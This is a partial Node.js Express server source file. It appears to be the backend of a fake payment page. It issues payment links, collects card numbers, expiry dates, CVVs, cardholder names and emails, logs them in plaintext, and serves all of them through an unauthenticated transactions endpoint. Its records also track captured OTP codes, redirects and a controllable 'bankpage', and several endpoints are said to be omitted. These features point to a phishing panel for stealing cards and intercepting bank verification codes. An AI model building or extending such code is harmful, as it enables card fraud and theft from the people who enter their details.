import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';

const app = express();

// Use JSON body parser and enable CORS
app.use(bodyParser.json());
app.use(cors());
app.use(express.static(".")); // serve static files from the current directory

// In–memory storage using Maps
const transactions = new Map();
const paymentLinks = new Map();

// =========================================
// Payment Link Generation Endpoint
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;
    
    // Validate inputs
    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ 
        status: "error", 
        message: "Invalid amount. Must be a positive number" 
      });
    }
    if (!description || !description.trim()) {
      return res.status(400).json({ 
        status: "error", 
        message: "Description cannot be empty" 
      });
    }
    
    // Generate a secure invoice ID (8-byte hex, uppercase)
    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Determine protocol (if behind a proxy, use x-forwarded-proto)
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    // Create the full payment link pointing to landing.html with query parameter "pid"
    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
    
    // Store payment link details
    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });
    
    // Return the payment link as JSON
    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({ 
      status: "error",
      message: "Internal server error. Please check server logs."
    });
  }
});
// =========================================

// Endpoint to fetch payment details (used by landing and payment pages)
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// (Other endpoints remain unchanged)

app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''),
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    bankpageVisible: false,
    timestamp: new Date().toLocaleString()
  };
  
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// (Other endpoints for OTP, status check, updateRedirectStatus, bankpage commands remain unchanged)
// … [Copy the rest of your unchanged endpoints here] …

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
